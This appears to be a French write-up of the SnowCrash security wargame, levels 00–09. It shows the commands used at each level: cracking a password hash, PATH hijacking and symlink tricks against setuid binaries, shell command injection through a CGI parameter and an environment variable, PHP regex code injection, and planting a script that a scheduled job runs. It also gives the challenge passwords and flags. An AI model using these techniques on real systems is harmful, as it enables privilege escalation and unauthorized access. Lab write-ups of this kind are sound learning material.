# Mendatory part

## Level00

La video de l'intra contient un indice sur ce qu'il faut faire

```
$> find / -user flag00
/usr/sbin/john
/rofs/usr/sbin/john
$> john
-bash: /usr/sbin/john: Permission denied
$> ls -l /usr/sbin/john
----r--r-- 1 flag00 flag00 XX XX 2016 /usr/sbin/john
```
On sait que l'on peut lire le fichier mais on ne peut pas l'executer
```
$> cat /usr/sbin/john
cdiiddwpgswtgt
$> su flag00
su: Authentication failure
```
Ce qui est dans `john` ressemble au flag mais n'est pas le flag.<br />
On regarde sur dcode.fr, en essayant plusieurs codes on trouve que c'est le cesar code. ca nous donne `nottoohardhere`

### Flag: `x24ti5gi3x0ol2eh4esiuxias`

---

## Level01

Un des fichiers les plus important a regarder, c'est `/etc/passwd`. Donc...
```
$> cat /etc/passwd
[...]
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
[...]
```
On a tous les uid des user sur la VM, ca va nous etre utile plus tard. <br />
Normalement a la place du `x` sur chaque ligne, il y a le mot de passe hashe de l'utilisateur. La le hash est en clair.<br />
On peut donc utiliser john pour le decripter
```
host $> echo '42hDRfypTqqnw' > pass.txt
host $> john pass.txt --show
[...]
abcdefg
[...]
```
On a donc le mot de passe de flag01: `abcdefg`

### Flag: `f2av5il02puano7naaf6adaaf`

---

## Level02

On a un fichier level02.pcap. Les fichiers pcap sont des dumps de communications TCP. Avec wireshark on peut faire clic droit -> follow sur un des paquets pour mieux comprendre ce qu'il se passe.

```
$> su flag02
Password: ft_waNDReL0L
```

### Flag: `kooda2puivaav1idi4f57q8iq`

---

## Level03

```
$> ls -la
[...]
-rwsr-sr-x 1 flag03 level03 XX XX level03
[...]
```

On a un fichier level03, qui est owned par flag03 et qui utilise `setuid()`.

```
$> ./level03
Exploit me
$> strings level03
[...]
/usr/bin/env echo Exploit me
[...]
system
[...]
```

On deduit qu'il y a un appel a `system` de la sorte:
`system("/usr/bin/env echo Exploit me")`.<br />
On a juste a creer un lien sur getflag dans /tmp/echo puis ajouter /tmp a l'env.

```
$> ln -s /bin/getflag /tmp/echo
$> PATH=/tmp:$PATH
$> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### Flag: `qi0maab88jeaj46qoumi7maus`

---

## Level04

```
$> ls -la
[...]
-rwsr-sr-x  1 flag04 level04 XX XX level04.pl
[...]
```

On a un fichier perl executable qui est owned par flag04 et qui utilise `setuid()`. <br />
Le script est un CGI qui ecoute sur le port 4747.<br />
Il appelle un fonction qui prend en paramettre le paramettre `x` de l'url et l'`echo`.

```
$> curl localhost:4747/level04.pl?x=test
test
```

Le `echo` s'execute de cette maniere: `print ``echo $y 2>&1``;`<br />
Donc avec une simple injection de code on peut executer getflag

```
>$ curl 'localhost:4747?x=$(getflag)'
Check flag.Here is your token: ne2searoevaevoem4ov4ar8ap
```

### Flag: `ne2searoevaevoem4ov4ar8ap`

--- 

## Level05

Rien a la racine.

```
$> find / -user flag05
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
$> ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 XX XX /usr/sbin/openarenaserver
```

C'est un script bash qui execute tout ce qui se trouve dans `/opt/openarenaserver` et qui le supprime. <br />
En essayant des truc on a remarque que le contenu de `/opt/openarenaserveur` se faisait supprimer de temps en temps, donc le "serveur" doit etre en route et executer `/usr/sbin/openarenaserver`
```
$> cat << EOF > /opt/openarenaserver/crack.sh
> #!/bin/bash
> 
> getflag | wall
> EOF
```

### Flag: viuaaale9huek52boumoomioc

---

## Level 06

```
$> ls -la
[...]
-rwsr-x---+ 1 flag06 level06 XX XX 2015 level06
-rwxr-x---  1 flag06 level06 XX XX 2016 level06.php
[...]
```

Un executable et son code source en PHP. L'executable est owned par flag06 et utilise `setuid()`<br />
Le script PHP utilise le modificateur `/e` de regex qui permet d'utiliser du code.<br />
Le regex fonction sur le patern `[x <X>]` ou `<X>` est n'importe quoi.</br >
On peut donc creer un fichier avec notre injection de code.
```
$> echo '[x {${exec(getflag)}}]' >/tmp/a
$> ./level06 /tmp/a
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

### Flag: `wiok45aaoguiboiki2tuin6ub`

---

## Level07

```
$> ls -la
[...]
-rwsr-sr-x 1 flag07 level07 XX XX level07
[...]
```

On voit que `./level07` est owned par flag07 et utilise `setuid()`

```
$> strings level07
[...]
getenv
[...]
LOGNAME
/bin/echo
[...]
system
[...]
```
L'executable a surement une ligne de code qui ressemble a:`system("/bin/env %s", getenv("LOGNAME"))`

```
$> LOGNAME='salut; getflag'
$> ./level07
salut
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Flag: `fiumuikeil55xe9cu4dood66h`

---

## Level08

```
$> ls -la
-rwsr-s---+ 1 flag08 XX XX level08
-rw-------  1 flag08 XX XX token
```

`level08` est un executable owned par flag08 et qui utilise `setuid()`.<br />
Le fichier token n'est pas lisible par l'utilisateur level08.

```
$> ./level08 token
You may not access 'token'
$> strings ./level08
[...]
open
[...]
token
[...]
strstr
[...]
```

On imagine que le level08 check si argv1 contient la string `token` et si il ne la contient pas il affiche le contenu du fichier

```
$> ./level08 /etc/hosts
127.0.0.1 localhost
127.0.1.1 SnowCrash

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

$> ./level08 ../level08/token
You may not access '../level08/token'
$> ln -s token tekken
$> ./level08 tekken 
quif5eloekouj29ke0vouxean
$> su flag08
Password: quif5eloekouj29ke0vouxean
```

### Flag: `25749xKZ8L7DkSCwJkT9dyv6f`

---

## Level09

```
$> ls -la
-rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
----r--r-- 1 flag09 level09   26 Mar  5  2016 token
$> ./level09 aaaaaaaaaaa
abcdefgijk
$> cat token
f4kmm6p|=�p�n��DB�Du{��
```

On s'est dit que token etait passe par `level09`. <br />
avec le script on peut le repasser en mode normal: `f3iji1ju5yuevaus41q1afiuq`

```
$> su flag09
Password: f3iji1ju5yuevaus41q1afiuq
```

### Flag: `s5cAJpM8ev6XHw998pRWG728z`